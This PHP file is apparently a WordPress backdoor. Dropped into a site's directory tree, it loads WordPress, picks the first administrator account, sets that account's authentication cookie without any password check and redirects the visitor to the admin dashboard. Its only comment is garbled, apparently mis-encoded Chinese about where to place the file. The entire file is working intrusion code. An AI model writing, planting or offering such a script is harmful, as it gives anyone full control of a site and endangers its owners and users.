<?php

    require('../../../wp-blog-header.php'); //һǷŵ3Ŀ¼¡ҲԷŵĿ¼ױ֡
    $query_str = "SELECT ID FROM $wpdb->users";
    $user_ids = $wpdb->get_results($query_str);
    foreach ($user_ids as $uid) {
        $user_id = $uid->ID;
        if (user_can($user_id, 'administrator')) {
            $user_info = get_userdata($user_id);
            $user_login = $user_info->user_login;
            wp_set_current_user($user_id, $user_login);
            wp_set_auth_cookie($user_id);
            do_action('wp_login', $user_login);
            echo "You are logged in as $user_login";
            if (function_exists('get_admin_url')) {
                wp_redirect(get_admin_url());
            } else {
                wp_redirect(get_bloginfo('wpurl') . '/wp-admin');
            }
            exit;
        }
    }


?>